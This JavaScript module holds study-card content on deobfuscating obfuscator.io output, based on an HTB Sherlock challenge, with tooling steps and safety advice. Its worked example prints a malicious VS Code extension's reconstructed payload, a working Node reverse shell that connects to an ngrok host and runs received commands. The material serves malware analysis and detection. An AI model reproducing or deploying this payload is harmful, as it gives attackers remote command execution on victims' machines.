export default {
  id: "js-deobfuscation",
  title: "JavaScript Deobfuscation (obfuscator.io)",
  src: "HTB Sherlock: ReliableThreat",
  icon: "🪬",
  cards: [
    {
      title: "Recognising obfuscator.io output",
      span2: true,
      blocks: [
        { t: "txt", text: "By far the most common JS obfuscator you'll meet in malicious npm packages, IDE extensions, phishing kits and skimmers. It's a <b>transform, not encryption</b> — everything needed to undo it ships inside the file, because the code has to run. Four layers stack together:" },
        { t: "table", head: ["Layer", "What it looks like", "Why it's there"], rows: [
          ["String array", "<code>function _0x3e52(){const _0x14a95e=['process','ess',...]}</code>", "no literal strings anywhere in the logic"],
          ["Indexed accessor", "<code>_0x423e(0x12b)</code> instead of <code>'child_process'</code>, with an offset subtracted inside", "breaks grep and reading comprehension"],
          ["Array rotation", "<code>while(!![]){try{...parseInt(...)...}catch{_0x5ade35['push'](_0x5ade35['shift']())}}</code>", "source-order array index ≠ runtime index"],
          ["Arithmetic constants", "<code>0x1fd*-0xb+-0x11d5+0x687f</code> instead of <code>16587</code>", "hides ports, sizes, offsets from a skim"],
        ]},
        { t: "note", kind: "info", title: "junk strings are checksum fuel", text: "Entries like <code>'433068GAVVdC'</code>, <code>'3558228jqdABL'</code> aren't used as data. The rotation loop runs <code>parseInt</code> over them until a checksum matches, which is how the array lands in the right order. Ignore them when reading." },
      ],
    },

    {
      title: "The workflow — three escalating steps",
      span2: true,
      blocks: [
        { t: "cmd", label: "1. beautify (layout only, never enough on its own)", code: "npx js-beautify sample.js > pretty.js" },
        { t: "cmd", label: "2. let a purpose-built tool undo the transform", code: "npx --yes webcrack pretty.js > clean.js\n# alternatives: npx deobfuscator (Synchrony)" },
        { t: "note", kind: "ok", title: "read webcrack's log, it tells you what you're dealing with", text: "<code>String Array: length 39</code> / <code>String Array Rotate: yes</code> / <code>inline-decoded-strings: 40 changes</code> confirms the transform. A line like <code>self-defending, debug-protection: 0 changes</code> means the author left obfuscator.io's anti-tamper options off — a small signal they used a default preset rather than tuning it." },
        { t: "txt", text: "<b>3. Manual decode</b>, when there's no network, the tool chokes, or you want to actually understand it. The decoder is self-contained and side-effect free, so you can run <i>only that part</i>:" },
        { t: "steps", items: [
          "Copy the beautified file to <code>decode.js</code>.",
          "Delete everything except the string-array function, the accessor function, and the rotation IIFE. <b>Especially delete the payload</b> — what's left can only return strings.",
          "Work out where indices start: the accessor subtracts a constant, e.g. <code>_0x44145a - (0x29*0x45 + -0xef7*0x2 + 0x13ed)</code> evaluates to 268 = <code>0x10C</code>.",
          "Append a dump loop and run it.",
        ]},
        { t: "cmd", label: "dump the whole lookup table, rotation already applied", code: "for (let i = 0x10c; i < 0x10c + 39; i++) {\n    console.log('0x' + i.toString(16), '=>', _0x423e(i));\n}" },
        { t: "cmd", label: "fold hidden constants with any interpreter", code: "node -e \"console.log(0x1fd*-0xb + -0x11d5 + 0x687f)\"   // 16587" },
      ],
    },

    {
      title: "Split strings — why grep lies to you here",
      span2: true,
      blocks: [
        { t: "note", kind: "danger", title: "the anti-grep trick", text: "Strings are stored in fragments and joined at the call site, so the thing you're hunting <b>never exists contiguously</b> in the file or in memory. Both of these were in one real sample:" },
        { t: "cmd", code: "'child_proc' + 'ess'        ->  child_process\n'6.tcp.eu.n' + 'grok.io'    ->  6.tcp.eu.ngrok.io" },
        { t: "note", kind: "warn", title: "consequence", text: "<code>strings memdump.raw | grep -i ngrok</code> returns <b>nothing</b> while the C2 hostname is sitting right there. Same failure class as forgetting <code>strings -el</code> for UTF-16LE: a negative grep result is not evidence of absence, it's evidence your search assumed contiguity." },
        { t: "note", kind: "ok", title: "practical fix", text: "Dump the string table and read the <b>call sites</b>, not just the table — concatenations only show up where the strings are used. Or deobfuscate first, then grep the cleaned file, where <code>merge-strings</code> has already rejoined the fragments." },
      ],
    },

    {
      title: "Safety rules",
      span2: true,
      blocks: [
        { t: "note", kind: "danger", title: "static first, always", text: "Beautifying and transforming code cannot hurt you. The moment you execute — even \"just to see what it resolves to\" — you're in a different risk category. Deobfuscation should be a text transformation, not a detonation." },
        { t: "note", kind: "warn", title: "if you must run something, run only the decoder", text: "String array + accessor + rotation return strings and nothing else. The payload IIFE (sockets, <code>child_process.exec</code>, file writes) never needs to run to be understood. Delete it from your scratch copy before invoking <code>node</code>." },
        { t: "note", kind: "warn", title: "never paste case evidence into a web deobfuscator", text: "Same discipline as not uploading unknown samples to VirusTotal — obf-io.deobfuscate.io, de4js and friends are fine for lab/CTF content, not for material from a real engagement. Local tooling only." },
        { t: "note", kind: "info", title: "dynamic option for nastier samples", text: "Monkey-patch the dangerous APIs before running: replace <code>net.Socket.prototype.connect</code> and <code>child_process.exec</code> with loggers, then let it run and print its own C2 and commands. Powerful, but it <i>is</i> execution — isolated analysis VM, no network, snapshot first." },
      ],
    },

    {
      title: "Worked example — malicious VS Code extension",
      span2: true,
      blocks: [
        { t: "txt", text: "A fake \"ChatGPT\" extension (<code>0xs1rx58d3v.chatgpt-b0t-0.0.1</code>) whose <code>extension.js</code> is a genuinely functional chatbot, with one obfuscated blob hidden inside the branch that handles the user typing <code>help</code>. Deobfuscated, the entire payload is this:" },
        { t: "cmd", label: "reconstructed payload", code: "const lockFilePath = path.join(os.homedir(), '.' + pid + '.lock');\nif (!fs.existsSync(lockFilePath)) {\n    fs.writeFile(lockFilePath, '', e => { if (e) console.error(e); });\n    const socket = new net.Socket();\n    socket.connect(16587, '6.tcp.eu.ngrok.io');\n    socket.on('data', d => {\n        require('child_process').exec(d.toString(), (err, stdout, stderr) => {\n            err ? socket.write(stderr) : socket.write(stdout);\n        });\n    });\n}" },
        { t: "table", head: ["Detail", "Why it matters"], rows: [
          ["Payload hidden in a working feature", "the user gets a normal chatbot reply, so there's no visible sign anything fired"],
          ["Lock file <code>~/.&lt;pid&gt;.lock</code>", "mutex so repeat triggering doesn't spawn many shells — and a clean host IOC to hunt for"],
          ["<code>exec()</code> per socket message", "textbook Node reverse shell: read bytes, run them, write output back"],
          ["ngrok TCP endpoint", "relay hides real attacker infra; resolves to cloud IPs (e.g. AWS eu-central-1) on a high random port"],
        ]},
        { t: "note", kind: "info", title: "how it looks from the host side", text: "The editor process spawns <code>cmd.exe /d /s /c \"...\"</code> — the <code>/d /s /c</code> combo is Node's <code>child_process.exec()</code> signature, not an interactive terminal. An IDE parenting a non-interactive shell is the detection, regardless of what the payload turns out to be." },
      ],
    },
  ],
};
